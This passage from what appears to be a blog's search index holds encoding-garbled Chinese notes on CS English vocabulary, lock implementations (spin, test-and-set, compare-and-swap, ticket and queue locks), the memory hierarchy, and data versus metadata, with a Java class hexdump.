schedule.(å®‰æ’æˆ–è®¡åˆ’ä¸­åˆ†é…çš„ä½ç½®)\nsandbox A sandbox is a place on a computer system where an untrusted program can be run without affecting other parts of the system.\nsuspend If you suspend something, you delay it or stop it from happening for a while or until a decision is made about it. æœ€è‘—åçš„ä¾‹å­å°±æ˜¯è¿›ç¨‹ suspendï¼Œä¹‹å scheduler å† decide æ˜¯ä¸æ˜¯å†æ¬¡è¿è¡Œã€‚\nshard Shards are pieces of broken glass, pottery, or metal. fragement,piece ä¸€ç‰‡ï¼Œæƒ³è±¡ä¸€ä¸‹æŠŠä¸€æ•´å—ç»ç’ƒæ‰“ç¢ï¼Œåˆ†æˆå¤šä¸ªç¢ç‰‡ï¼Œscale out..\nstandby A standby is something or someone that is always ready to be used if they are needed.\nsegment A segment of something is one part of it, considered separately from the rest. æ•´ä½“çš„ä¸€éƒ¨åˆ†ï¼Œåˆ†æ®µï¼Œå’Œä½™ä¸‹çš„éƒ¨åˆ†åˆ†å¼€çš„ã€‚\nsplit If something splits or if you split it, it is divided into two or more parts.\nsegregate To segregate two groups of people or things means to keep them physically apart from each other.\nsurrogate You use surrogate to describe a person or thing that is given a particular role because the person or thing that should have the role is not available. ä»£ç†\nsweep If someone makes a sweep of a place, they search it, usually because they are looking for people who are hiding or for an illegal activity. æœå¯»ï¼Œæ‰«è¡ If lights or someoneâ€™s eyes sweep an area, they move across the area from side to side. ç£ç›˜çš„è°ƒåº¦ç®—æ³•ä¹‹ elevator(SCAN/C-SCAN) ä»æœ€å†…éƒ¨å‘æœ€å¤–éƒ¨(åä¹‹äº¦å¯)çš„ç£é“æ‰«æ\nscatter If you scatter things over an area, you throw or drop them so that they spread all over the area.","t#t":" ternary\ncomposed of three parts ä¸‰å…ƒ\ntrade-off\nbalance achieved between two desirable but incompatible features; balancing of factors all of which are not attainable at the same time å¹³è¡¡ä¸¤ä¸ªäº’ä¸å…¼å®¹çš„ç‰¹æ€§ï¼Œå¦¥å\ntrade off\nIf you trade off one thing against another, you exchange all or part of one thing for another, as part of a negotiation or compromise. ä»¥ â€¦ æ¢å–\ntraid / triplet\nticket\na certificate or token showing that a fare or admission fee has been paid ç¥¨\ntuple\ncomputing a row of values in a relational database å…³ç³»å‹æ•°æ®åº“ä¸­çš„ä¸€è¡Œå°±æ˜¯ tuple\ntransient Transient is used to describe a situation that lasts only a short time or is constantly changing. æŒç»­æ—¶é—´å¾ˆçŸ­æˆ–è€…ä¸€ç›´åœ¨å˜åŒ–çš„æƒ…å†µï¼Œå’Œ persistent ç›¸å\ntransition Transition is the process in which something changes from one state to another. ä¸€ä¸ªçŠ¶æ€å˜æˆå¦ä¸€ä¸ªçŠ¶æ€, è¿™æ˜¯ä»€ä¹ˆ? è¿™å°±æ˜¯çŠ¶æ€æœºã€‚\ntrap A trap is a device which is placed somewhere or a hole which is dug somewhere in order to catch animals or birds.","u#u":"","v#v":" virtualize To virtualize means to take something of one form and make it appear to be another form. è¿™ä¸å°±æ˜¯ transformer ğŸ¤£","w#w":"","x#x":"","y#y":" yield If you yield something that you have control of or responsibility for, you allow someone else to have control or responsibility for it è‡ªæ„¿è®©å‡º ","z#z":""},"title":"cs-english-words"},"/blog/cs-lock/":{"data":{"":"","critical-section#critical section":" balance = balance + 1; åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œè¿™æ®µä»£ç æ‰§è¡Œæœ‰é—®é¢˜ã€‚å¦‚ä½•ä¿è¯ä»»æ„æ—¶åˆ»ï¼Œåªæœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨æ‰§è¡Œè¿™æ®µä»£ç å‘¢ï¼Ÿç”¨ lockï¼Œè·å–è¿™ä¸ªé”ä¹‹åï¼Œæ‰å¯ä»¥æ‰§è¡Œè¿™æ®µä»£ç ï¼Œè¿™æ®µä»£ç æ‰§è¡Œå®Œæ¯•åï¼Œé‡Šæ”¾è¿™ä¸ªé”ã€‚æ²¡æœ‰è·å–é”çš„çº¿ç¨‹ï¼Œæ— æ³•æ‰§è¡Œè¿™æ®µä»£ç ã€‚ä¹Ÿå¯ä»¥è®¤ä¸ºé€šè¿‡ lock æ¥ç›‘è§†è¿™æ®µä»£ç ä»»æ„æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œã€‚ä¸é”™ï¼Œmonitor æœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªé”ã€‚","lock-æ˜¯å•¥#lock æ˜¯å•¥ï¼Ÿ":"lock æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå˜é‡ã€‚å˜é‡æœ¬è´¨ä¸Šæ˜¯ä¸€å—å†…å­˜ã€‚å½’æ ¹ç»“åº•ï¼Œlock å°±æ˜¯ä¸€å—å†…å­˜ï¼Œç”¨è¿™å—å†…å­˜æ¥ä¿è¯çº¿ç¨‹çš„åŸå­æ€§ã€‚é”æœ‰ä¸¤ç§çŠ¶æ€ï¼š\nè¢«å ç”¨ ç©ºé—² ","references#References":" Lock gcc-inline-assembly-howto atomic-exchange compare-and-swap-lock lock cpmxchg xadd system-call-table sched_yield gettid ","spin-lock-çš„é—®é¢˜#Spin Lock çš„é—®é¢˜":"spin forever çº¿ç¨‹æœ‰ä¼˜å…ˆçº§çš„æ¦‚å¿µã€‚ Thread1(priority1) \u003c Thread(priority2), åœ¨ Thread1 å’Œ Thread2 éƒ½æ˜¯ runnable æƒ…å†µä¸‹ï¼Œè°ƒåº¦å™¨ä¿è¯å…ˆè¿è¡Œ Thread2ã€‚ ç”±ä¸Šå›¾å¯çŸ¥ï¼ŒThread2 å¯èƒ½æ°¸è¿œæ— æ³•è·å–é”ï¼Œå¯¼è‡´ç³»ç»ŸæŒ‚æ‰ã€‚\nPriority Inversion æœ‰ä¸Šå›¾å¯çŸ¥ Thread2 æœ‰å¯èƒ½åœ¨ Thread3 ä¹‹å‰è¿è¡Œï¼Œè¿™ä¸ç¬¦åˆçº¿ç¨‹ä¼˜å…ˆçº§çš„è¦æ±‚ã€‚ Thread2 å’Œ Thread3 çš„ä¼˜å…ˆçº§åè½¬äº†ã€‚","two-phrase-lock#two-phrase-lock":" spin(å…ˆæ—‹è½¬ä¸€æ®µæ—¶é—´ï¼Œçœ‹èƒ½ä¸èƒ½è·å–é”) sleep(å…ˆæ—‹è½¬ä¸€æ®µæ—¶é—´ï¼Œä¸èƒ½è·å–é”ï¼Œçº¿ç¨‹è¿›å…¥ sleep çŠ¶æ€ï¼Œæ”¾å¼ƒ CPU) ","ä¸ºå•¥éœ€è¦-lock#ä¸ºå•¥éœ€è¦ lockï¼Ÿ":" å¤šå¤„ç†å™¨çš„å­˜åœ¨ ä¸­æ–­çš„å­˜åœ¨ ","å¦‚ä½•è¯„ä¼°ä¼°é”#å¦‚ä½•è¯„ä¼°ä¼°é”":"mutual exclusion é”ï¼Œæä¾›äº’æ–¥åŠŸèƒ½ã€‚\nfairless æ˜¯å¦ä¼šæœ‰çº¿ç¨‹é¥¥é¥¿\nperformance ","å¦‚ä½•é¿å…-spin#å¦‚ä½•é¿å… spinï¼Ÿ":"yield(æ”¾å¼ƒ CPU) void init() { flag = 0; } void lock() { while (TestAndSet(\u0026flag, 1) == 1) yield(); // give up the CPU, çº¿ç¨‹çŠ¶æ€ç”± running-\u003eready } void unlock() { flag = 0; } å½“ä¸€ä¸ªçº¿ç¨‹æ— æ³•è·å–é”æ—¶ï¼Œä¸æ˜¯ spinï¼Œè€Œæ˜¯ yield(), çº¿ç¨‹çŠ¶æ€ç”± running å˜ä¸º readyã€‚ è¿™æ ·å°±èŠ‚çº¦äº†æ—¶é—´ã€‚ä½†æ˜¯æ— æ³•è§£å†³é¥¥é¥¿é—®é¢˜ã€‚ è‹¥ä¸€ä¸ªçº¿ç¨‹ä¸åœçš„è·å–é”ï¼Œè¿›å…¥ä¸´ç•ŒåŒºï¼Œé‡Šæ”¾é”ã€‚ å…¶ä»–çš„å°è¯•è·å–é”çš„çº¿ç¨‹å°±ä¼šä¸æ–­çš„ yieldã€‚\nUsing Queues: Sleeping Instead Of Spinning Lock With Queues, Test-and-set, Yield, And Wakeup typedef struct __lock_t { int flag; // lock int guard; // spin lock queue_t *q; // é˜Ÿåˆ—,éœ€è¦é”çš„çº¿ç¨‹æ”¾åœ¨é˜Ÿåˆ—é‡Œï¼Œé¿å…é¥¥é¥¿ã€‚ } lock_t; void lock_init(lock_t *m) { m-\u003eflag = 0; m-\u003eguard = 0; queue_init(m-\u003eq); } void lock(lock_t *m) { while (TestAndSet(\u0026m-\u003eguard, 1) == 1) ; //acquire guard lock by spinning if (m-\u003eflag == 0) { m-\u003eflag = 1; // lock is acquired m-\u003eguard = 0; } else { queue_add(m-\u003eq, gettid()); //1 çº¿ç¨‹ id æ”¾å…¥é˜Ÿåˆ— setpark(); // å°†è¦ park()ï¼ï¼ï¼ï¼ m-\u003eguard = 0; //2 park(); //3 running-\u003esleepï¼Œè¢« unpark() å«é†’ï¼Œå°±åƒåœ¨è¿™é‡Œè¿”å›ã€‚å…ˆå»è·å– guard è¿™ä¸ª spin lockã€‚ } } void unlock(lock_t *m) { // å…ˆè·å– guard è¿™ä¸ª spin lock while (TestAndSet(\u0026m-\u003eguard, 1) == 1){ ; //acquire guard lock by spinning } if (queue_empty(m-\u003eq)) // é˜Ÿåˆ—ä¸ºç©ºï¼Œæ²¡æœ‰ç­‰å¾…é”çš„çº¿ç¨‹ m-\u003eflag = 0; // let go of lock; no one wants it else unpark(queue_remove(m-\u003eq)); //4 hold lock, å«é†’è¿™ä¸ª m-\u003eq çº¿ç¨‹ã€‚ // (for next thread!) m-\u003eguard = 0; } ","æ„å»º-lock#æ„å»º Lock":"æ§åˆ¶ä¸­æ–­ void lock(){ disableInterrupts(); // å…³é—­ä¸­æ–­ } void unlock(){ enableInterrputs(); // å¼€å¯ä¸­æ–­ } å¯¹äºå•å¤„ç†å™¨ï¼Œå¯ä»¥ç›´æ¥æ¥å…³é—­ä¸­æ–­ã€å¼€å¯ä¸­æ–­çš„æ–¹å¼æ¥å®ç°çº¿ç¨‹çš„åŸå­æ€§ã€‚ å…³é—­ã€å¼€å¯ä¸­æ–­çš„æŒ‡ä»¤æ˜¯ç‰¹æƒæŒ‡ä»¤ã€‚\nä¼˜ç‚¹ å®ç°ç®€å•ã€ä¾¿äºç†è§£ã€‚åœ¨å…³é—­ä¸­æ–­çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä¿è¯çº¿ç¨‹çš„æ‰§è¡Œä¸ä¼šè¢«æ‰“æ–­ã€‚\nç¼ºç‚¹ éœ€è¦ç‰¹æƒæŒ‡ä»¤ã€‚å¯èƒ½è¢«æ»¥ç”¨ã€‚è‹¥ä¸€ä¸ªç¨‹åºå…³é—­ä¸­æ–­åï¼Œæ‰§è¡Œæ­»å¾ªç¯ï¼Œé‚£ä¹ˆå°±éœ¸å äº† CPUï¼Œæƒ³è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå°±åªå¥½é‡å¯äº†ã€‚ åœ¨å¤šæ ¸çš„å¤„ç†å™¨ä¸Šï¼Œå…³é—­ä¸­æ–­æ²¡æœ‰ç”¨ã€‚å› ä¸ºå…¶ä»–çº¿ç¨‹å¯ä»¥åœ¨å…¶ä»–å¤„ç†å™¨ä¸Šè¿è¡Œï¼Œä¹Ÿå¯ä»¥è¿›å…¥ä¸´ç•ŒåŒºã€‚ å¯èƒ½ä¼šä¸¢å¤±å…¶ä»–çš„ä¸­æ–­ä¿¡å·ã€‚ä¸€ç›´åœ¨å¤„ç†è¿™ä¸ªä¸­æ–­ï¼Œæ²¡ç©ºæ­ç†å…¶ä»–çš„ä¸­æ–­è¯·æ±‚ã€‚ ä½æ•ˆã€‚å¤„ç†ä¸­æ–­è¿˜æ˜¯å¾ˆéº»çƒ¦çš„ã€‚ å¤±è´¥çš„å°è¯•ï¼Œåªç”¨ Loads/Stores typedef struct __lock_t{ int flag; // lock çŠ¶æ€ } lock_t; void init(lock_t *mutex){ // 0 -\u003e lock is available // 1 -\u003e held mutex-\u003eflag = 0; } void lock(lock_t *mutex){ while(mutex-\u003eflag == 1){ // æ£€æµ‹é”æ˜¯å¦è¢«å ç”¨(L1) ; // spin-wait(do noting)(L2) } mutex-\u003eflag = 1; // è·å–é”(L3) } void unlock(lock_t *mutex){ mutex-\u003eflag = 0; // é‡Šæ”¾é”(U1) } Loads/Stores åˆ†æ ä¸Šå›¾å¯è§ï¼Œç”±äºä¸­æ–­çš„å­˜åœ¨ï¼Œåœ¨1.æ£€æµ‹é”æ˜¯å¦è¢«å ç”¨ 2.è·å–é” è¿™ä¸¤ä¸ªæ­¥éª¤ä¹‹é—´ï¼Œå¯èƒ½è¢«æ‰“æ–­ï¼Œè¿™æ ·ä¸¤ä¸ªçº¿ç¨‹éƒ½è·å–äº†è¿™ä¸ªé”ã€‚è¿™ä¸ç¬¦åˆé”çš„åŸºæœ¬åŠŸèƒ½ï¼Œæ²¡æœ‰æä¾›äº’æ–¥ã€‚æ— æ³•ä¿è¯ä¸´ç•ŒåŒºï¼Œä»»æ„æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨æ‰§è¡Œã€‚ å¦‚æœä¸€ä¸ªçº¿ç¨‹ T1 å·²ç»è·å–äº†é”ï¼Œå¦å¤–ä¸€ä¸ªçº¿ç¨‹ T2 åœ¨è·å–é”æ—¶ï¼Œä¼šåœ¨ L1 å¤„ä¸åœçš„åˆ¤æ–­é”çš„çŠ¶æ€ï¼Œè¿™å°±æ˜¯åœ¨ L1 å¤„ Spinï¼Œè¿™å°±æ˜¯æ‰€è°“çš„ Spin Lockã€‚ test-and-set(atomic exchange) æ„å»ºé” å› ä¸ºåªæ˜¯ç®€å•çš„ Loads/Stores(Reads/Writes) ä¸èƒ½æ„å»ºå‡º Lockã€‚æ‰€ä»¥å¼•å…¥å’Œæ”¯æŒæ„å»º Lock çš„ test-and-set æŒ‡ä»¤ã€‚åœ¨ x86 ä¸‹ï¼ŒæŒ‡ä»¤æ˜¯ xchgã€‚Exchanges the contents of the destination (first) and source (second) operands. The operands can be two general-purpose registers or a register and a memory location. If a memory operand is referenced, the processorâ€™s locking protocol is automatically implemented for the duration of the exchange operation, regardless of the presence or absence of the LOCK prefix or of the value of the IOPL. ç”¨ xchg åŸå­äº¤æ¢æ¥å®ç°ã€‚\nC è¯­è¨€è¡¨ç¤º test-and-set è¯­ä¹‰ int TestAndSet(int *old_ptr, int new) { int old = *old_ptr; // fetch old value at old_ptr, Read *old_ptr = new; // store â€™newâ€™ into old_ptr, Write return old; // return the old value } test-and-set æ„å»ºé” typedef struct __lock_t{ int flag; // lock çŠ¶æ€ } lock_t; void init(lock_t *lock){ // 0 -\u003e lock is available // 1 -\u003e held lock-\u003eflag = 0; } void lock(lock_t *lock){ while(TestAndSet(lock-\u003eflag, 1) == 1){ // æ£€æµ‹é”æ˜¯å¦è¢«å ç”¨,åŒæ—¶å°† flag è®¾ç½®ä¸º 1(L1) ; // spin-wait(do noting)(L2) } } void unlock(lock_t *lock){ lock-\u003eflag = 0; // é‡Šæ”¾é”(U1) } test-and-set spin-lock åˆ†æ correctness ç”±ä¸Šå›¾åˆ†æå¯çŸ¥ï¼Œtest-and-set è¿™ä¸ª spin lock æä¾›äº† mutual exclusionï¼Œè¿™æ˜¯é”çš„åŸºæœ¬åŠŸèƒ½ã€‚\nfairness spin lock ä¸æ˜¯å…¬å¹³çš„ï¼Œå¯èƒ½å¯¼è‡´çº¿ç¨‹é¥¥é¥¿ã€‚\nperformance å•å¤„ç†å™¨ å¯¹äº spin lockï¼Œå‡å®šæœ‰ N ä¸ªçº¿ç¨‹ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªçº¿ç¨‹å·²ç»æŒæœ‰çš„è¿™ä¸ªé”ã€‚å…¶ä½™ N - 1 ä¸ªçº¿ç¨‹æ¥è·å–è¿™ä¸ªé”ï¼Œå½“è°ƒåº¦å™¨è°ƒåº¦ä¸€ä¸ªçº¿ç¨‹è·å–é”æ—¶ï¼Œä¼šåœ¨æ—¶é—´ç‰‡(T)å†…ä¸€ç›´æ­»å¾ªç¯åˆ¤å®š TestAndSet çš„è¿”å›å€¼ï¼Œç›´åˆ°æ—¶é—´ç‰‡æ¶ˆè€—å®Œï¼Œçº¿ç¨‹åˆ‡å‡ºã€‚ä¼šæµªè´¹ (N - 1) * T è¿™ä¹ˆå¤šæ—¶é—´ã€‚\nå¤šå¤„ç†å™¨ ç”±å›¾å¯çŸ¥ï¼Œåœ¨å¤šå¤„ç†å™¨ç¯å¢ƒä¸­ï¼Œè‹¥ critical section å¾ˆçŸ­ï¼Œåœ¨ Thread1 é‡Šæ”¾è¿™ä¸ªé”åï¼Œå…¶ä½™çš„çº¿ç¨‹æ˜¯å¯ä»¥è·å–è¿™ä¸ªé”çš„ã€‚è€—æ—¶å¹¶ä¸é•¿ã€‚\nCompare-And-Swap(Exchange) æ„å»ºé” C è¯­è¨€è¡¨ç¤º Compare-And-Swap è¯­ä¹‰ int CompareAndSwap(int *ptr, int expected, int new) { int original = *ptr; if (original == expected) *ptr = new; return original; } Compare-And-Swap æ„å»ºé” typedef struct __lock_t{ int flag; // lock çŠ¶æ€ } lock_t; void init(lock_t *lock){ // 0 -\u003e lock is available // 1 -\u003e held lock-\u003eflag = 0; } void lock(lock_t *lock){ while(CompareAndSwap(\u0026lock-\u003eflag, 0, 1) == 1){ // æ£€æµ‹é”æ˜¯å¦è¢«å ç”¨ ; // spin-wait(do noting)(L2) } } void unlock(lock_t *lock){ lock-\u003eflag = 0; // é‡Šæ”¾é”(U1) } x86-version of compare-and-swap char compare_and_swap(int *ptr, int old, int new) { unsigned char ret; // Note that sete sets a â€™byteâ€™ not the word __asm__ __volatile__ ( \" lock\\n\" // ä¿è¯åŸå­æ€§ \" cmpxchgl %2,%1\\n\" // cmpxchgl new, *ptr, %rax = oldï¼ŒThe ZF flag is set if the values in the destination operand and register AL, AX, or EAX are equal; otherwise it is cleared. \" sete %0\\n\" // ZF = 0 : \"=q\" (ret), \"=m\" (*ptr) // output 0,1 : \"r\" (new), \"m\" (*ptr), \"a\" (old) // input 2,3,4 : \"memory\"); // clobber list return ret; } Fetch-And-Add æ„å»ºé” C è¯­è¨€è¡¨ç¤º Fetch-And-Add è¯­ä¹‰ int FetchAndAdd(int *ptr) { int old = *ptr; *ptr = old + 1; return old; } æ„å»º ticket lock typedef struct __lock_t{ int ticket; int turn; } lock_t; void lock_init(lock_t *lock){ lock-\u003eticket = 0; lock-\u003eturn = 0; } void lock(lock_t *lock){ int myturn = FetchAndAdd(\u0026lock-\u003eticket); // è·å–ç¥¨å·ï¼Œç±»ä¼¼äºç”¨ç¥¨å·æ¥ç»™è¦è·å–é”çš„çº¿ç¨‹æ’é˜Ÿã€‚æ‹¿åˆ°ç¥¨å·çš„æœ€ç»ˆéƒ½ä¼šæˆåŠŸè·å–é”ã€‚ while(lock-\u003eturn != myturn){ ; // spin } } void unlock(lock_t *lock){ lock-\u003eturn = lock-\u003eturn + 1; // ä¸‹ä¸€ä½ } "},"title":"cs-lock"},"/blog/csapp-memory-hierarchy/":{"data":{"disk-controller#Disk Controller":" æˆ‘ä»¬çŸ¥é“å®šä½ä¸€ä¸ªç£ç›˜ç©ºé—´éœ€è¦ä¸‰ä¸ªå‚æ•°(platter, track, sector). ä½†æ˜¯ cpu ä¸ä½¿ç”¨è¿™ä¹ˆéº»çƒ¦çš„æ–¹å¼, cpu ä½¿ç”¨çš„æ˜¯é€»è¾‘ç›˜å·. ä¹Ÿå°±æ˜¯ç£ç›˜æ§åˆ¶å™¨å°†é€»è¾‘ç›˜å·ç¿»è¯‘æˆ platter, track, sector. ç£ç›˜æ§åˆ¶å™¨å……å½“ä¸€ä¸ªä¸­é—´å±‚. ä¹Ÿå°±æ˜¯åªå…³å¿ƒé€»è¾‘ç›˜å·, ä¸å…³å¿ƒå…·ä½“çš„(platter, track, sector). é€šè¿‡é€»è¾‘ç›˜å·å°†ä¸‰ç»´çš„(platter, track, sector) è½¬æ¢ä¸ºä¸€ç»´æ•°ç»„, è¿™å°±æ˜¯æŠ½è±¡çš„æ„ä¹‰å•Š. è¿™å°±æ˜¯é™ç»´æ€ç»´å˜›.","memory-hierarchy#Memory Hierarchy":" æˆ‘ä»¬çŸ¥é“ä¸åŒç±»å‹çš„å­˜å‚¨, æ¯ä¸€ä¸ª bit çš„ä»·æ ¼ä¸ä¸€æ ·, å…ƒä»¶ä¸åŒ, é€Ÿåº¦ä¹Ÿä¸åŒ. ä¸–ä¸Šäº‹æƒ…å¤§æŠµå¦‚æ­¤,ä¸ä¼šé›†æ‰€æœ‰ä¼˜ç‚¹äºä¸€èº«.\nåˆ©ç”¨ç¨‹åºçš„å±€éƒ¨æ€§, æ„é€ ä¸€ä¸ªå±‚æ¬¡å­˜å‚¨ç³»ç»Ÿ, æ¯ä¸€å±‚çš„å­˜å‚¨å½“åšä¸‹ä¸€å±‚çš„ç¼“å­˜,(ä¹Ÿå°±æ˜¯ä¸‹ä¸€å±‚çš„ä¸€éƒ¨åˆ†)è¿™æ‰ä¼šæœ‰ hit å’Œ miss çš„æ ¹æœ¬åŸå› å•Š! è¿™æ‰ä¼šå¼•å‡ºç¼“å­˜çš„ placement policy å’Œ replacement policy. ç¼“å­˜è¿™ç§æ€æƒ³å’Œæ™®é, åšå¼€å‘æ—¶ redis ä½œä¸ºæ•°æ®åº“çš„ç¼“å­˜, ä¹Ÿæ˜¯è§£å†³é€Ÿåº¦ä¸åŒ¹é…çš„é—®é¢˜.","storage#storage":"storage"},"title":"csapp-memory-hierarchy"},"/blog/data-and-metadata/":{"data":{"":" å…·ä½“é—®é¢˜å…·ä½“åˆ†æï¼Œç¡®å®éå¸¸é‡è¦ã€‚ç”¨æ­£ç¡®çš„æ€æƒ³æŒ‡å¯¼è¡ŒåŠ¨ï¼Œæ‰å¯äº‹åŠåŠŸå€ã€‚ ç°å®ä¸­çš„å®¢è§‚é—®é¢˜æœ‰æ„æ€çš„åœ°æ–¹åœ¨äºï¼šæ— è®ºä½ é€‰æ‹©çœ‹å¾—è§ï¼Œè¿˜æ˜¯é€‰æ‹©çœ‹ä¸è§ï¼Œå®ƒéƒ½åœ¨é‚£é‡Œï¼Œå…³é”®åœ¨äºæœ‰æ²¡æœ‰äººå»è§£å†³ï¼Œè§£å†³çš„äººæœ‰å¤šå¤§çš„å†³å¿ƒã€‚","data-vs-metadata#data vs metadata":" Metadata is â€œdata that provides information about other dataâ€. In other words, it is â€œdata about dataâ€. æ­£å¦‚è¿™ä¸ªä¸–ä¸Šçš„äººï¼Œæ— è®ºæ‰¿è®¤ä¸å¦ï¼Œåˆ†ä¸ºä¸¤ç±»ï¼šç»Ÿæ²»è€…ä¸è¢«ç»Ÿæ²»è€…ã€‚æ•°æ®ä¹Ÿä¸å¯é¿å…çš„è¢«åˆ†ä¸ºä¸¤ç§ï¼šmetadata å’Œ dataã€‚æ•°æ®çš„æ•°æ®å’Œæ•°æ®ã€‚ä¸¤è€…ç›¸è¾…ç›¸æˆã€‚\nphysical data æ•°æ®(è¢«ç»Ÿæ²»è€…) metadata å…ƒæ•°æ®(ç»Ÿæ²»è€…) æ­£å¦‚å¦‚æœè¢«ç»Ÿæ²»è€…éƒ½æ²¡æœ‰äº†ï¼Œé‚£ä¹Ÿè°ˆä¸ä¸Šç»Ÿæ²»è€…ã€‚åœ¨ä¸€ä¸ªä¸ªå®ä½“ç¡®å®å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰æ•°æ®ï¼Œé‚£ä¹Ÿè°ˆä¸ä¸Šå…ƒæ•°æ®ã€‚\nlogical æœ‰æ—¶æ²¡æœ‰å®ä½“çš„å­˜åœ¨ä½†æ˜¯ä¹Ÿå¯ä»¥åœ¨é€»è¾‘ä¸Šåˆ’åˆ† data å’Œ Metadata çš„ã€‚æ¯”å¦‚ç½‘ç»œä¸­çš„æµé‡ã€‚ä»…ä»…æ˜¯ç”¨æˆ·çœŸæ­£çš„æ•°æ®å—ï¼Ÿä¸ï¼Œå…¶å®è¿˜æœ‰è·¯ç”±å™¨ä¹‹é—´çš„æµé‡, è¿™éƒ¨åˆ†æµé‡å¯¹äºæ•´ä¸ªç½‘ç»œç³»ç»Ÿçš„æ­£å¸¸è¿è¡Œï¼Œä¸å¯ç¼ºå°‘ã€‚\nThe control plane is the part of a network that controls how data is forwarded, while the data plane is the actual forwarding process. é‚£ä¹ˆç½‘ç»œæµé‡å°±å¯ä»¥åœ¨é€»è¾‘ä¸Šï¼ˆä¹Ÿå°±æ˜¯è™šæ‹Ÿçš„ï¼‰åˆ’åˆ†ä¸ºï¼š control plane æ§åˆ¶å¹³é¢ï¼ˆè§†ä¸º Metadataï¼‰ data/forward plane æ•°æ®å¹³é¢ï¼ˆè§†ä¸º dataï¼‰ ä»è¿™ä¸ªè§’åº¦æ¥ç†è§£ï¼Œmetadata æœ‰æ§åˆ¶æ•°æ®çš„æ„æ€ï¼Œæ§åˆ¶çœŸæ­£çš„ç”¨æˆ·æ•°æ®å¦‚ä½•è½¬å‘ã€‚è™½ç„¶å¤§å®¶éƒ½æ˜¯åŒä¸€ç§äº‹ç‰©(éƒ½æ˜¯æ•°æ®åŒ…)ï¼Œä½†æ˜¯åˆä¸æ˜¯å¹³ç­‰çš„äº‹ç‰©ã€‚å’³å’³ï¼Œæ¢æˆäººç±»ï¼Œä¼¼ä¹ä¹Ÿè¯´å¾—è¿‡å»ã€‚\nstructural metadata è¿™ç§ç»“æ„æ€§çš„ metadata ç›¸å½“äºä¸€ä»½è¯´æ˜ä¹¦ï¼Œæ¥è¯´æ˜å“ªä¸€ä¸ªä½ç½®çš„æ•°æ®æ˜¯ä»€ä¹ˆæ•°æ®ã€‚\njava class format Java ä»£ç ç»è¿‡ç¼–è¯‘ï¼Œå¯ä»¥çš„åˆ°ä¸€ä¸ª .class æ–‡ä»¶ã€‚\nHello.java public class Hello { public static void main(String[] args) { System.out.println(\"Hello, World\"); } } Hello.class root@aliyun:java# xxd Hello.class 00000000: cafe babe 0000 0034 001d 0a00 0600 0f09 .......4........ 00000010: 0010 0011 0800 120a 0013 0014 0700 1507 ................ 00000020: 0016 0100 063c 696e 6974 3e01 0003 2829 .....\u003cinit\u003e...() 00000030: 5601 0004 436f 6465 0100 0f4c 696e 654e V...Code...LineN 00000040: 756d 6265 7254 6162 6c65 0100 046d 6169 umberTable...mai 00000050: 6e01 0016 285b 4c6a 6176 612f 6c61 6e67 n...([Ljava/lang 00000060: 2f53 7472 696e 673b 2956 0100 0a53 6f75 /String;)V...Sou 00000070: 7263 6546 696c 6501 000a 4865 6c6c 6f2e rceFile...Hello. 00000080: 6a61 7661 0c00 0700 0807 0017 0c00 1800 java............ 00000090: 1901 000c 4865 6c6c 6f2c 2057 6f72 6c64 ....Hello, World 000000a0: 0700 1a0c 001b 001c 0100 0548 656c 6c6f ...........Hello 000000b0: 0100 106a 6176 612f 6c61 6e67 2f4f 626a ...java/lang/Obj 000000c0: 6563 7401 0010 6a61 7661 2f6c 616e 672f ect...java/lang/ 000000d0: 5379 7374 656d 0100 036f 7574 0100 154c System...out...L 000000e0: 6a61 7661 2f69 6f2f 5072 696e 7453 7472 java/io/PrintStr 000000f0: 6561 6d3b 0100 136a 6176 612f 696f 2f50 eam;...java/io/P 00000100: 7269 6e74 5374 7265 616d 0100 0770 7269 rintStream...pri 00000110: 6e74 6c6e 0100 1528 4c6a 6176 612f 6c61 ntln...(Ljava/la 00000120: 6e67 2f53 7472 696e 673b 2956 0021 0005 ng/String;)V.!.. 00000130: 0006 0000 0000 0002 0001 0007 0008 0001 ................ 00000140: 0009 0000 001d 0001 0001 0000 0005 2ab7 ..............*. 00000150: 0001 b100 0000 0100 0a00 0000 0600 0100 ................ 00000160: 0000 0100 0900 0b00 0c00 0100 0900 0000 ................ 00000170: 2500 0200 0100 0000 09b2 0002 1203 b600 %............... 00000180: 04b1 0000 0001 000a 0000 000a 0002 0000 ................ 00000190: 0003 0008 0004 0001 000d 0000 0002 000e ................ Hello.class æ€æ ·è§£æçš„ï¼Ÿ å¦‚æœä¸¢ç»™æˆ‘ä¸€ä¸ª .class æ–‡ä»¶ï¼Œå…¶ä»–å•¥ä¹Ÿæ²¡æœ‰ã€‚æˆ‘ä¹Ÿçœ‹ä¸æ‡‚ã€‚ä½†æ˜¯ç”±äº class file format çš„å­˜åœ¨ï¼Œåªè¦è¶³å¤Ÿè€å¿ƒï¼Œè‡ªå·±ä¹Ÿå¯ä»¥è§£æå‡º .class æ˜¯æ€æ ·çš„ã€‚è¿™é‡Œçš„ class format å°±æ˜¯ Metadataã€‚æ²¡æœ‰è¿™ä¸ªæ ¼å¼è¯´æ˜ï¼Œè°ä¹Ÿå¼„ä¸æ˜ç™½è¿™ä¸€å †äºŒè¿›åˆ¶çš„ 0 å’Œ 1 æ˜¯å•¥æ„æ€ã€‚\nIP header IP è¿™ä¸ªåè®®æ˜¯ç”¨æ¥å°†ä¸åŒå±€åŸŸç½‘ç»„æˆäº’è”ç½‘çš„ã€‚æ—¢ç„¶é€šä¿¡æ˜¯åŒå‘çš„ï¼Œè¦çŸ¥é“å‘é€è€…çš„ IPï¼Œæ¥æ”¶è€…çš„ IPï¼ŒIP åŒ…çš„æ€»å¤§å°ï¼ŒIP Header çš„å¤§å°ï¼Œè¿™ä¸ª IP åŒ…èƒ½è·¨è¶Šå¤šå°‘è·¯ç”±å™¨(TTL)ï¼Œä½¿ç”¨çš„ IP 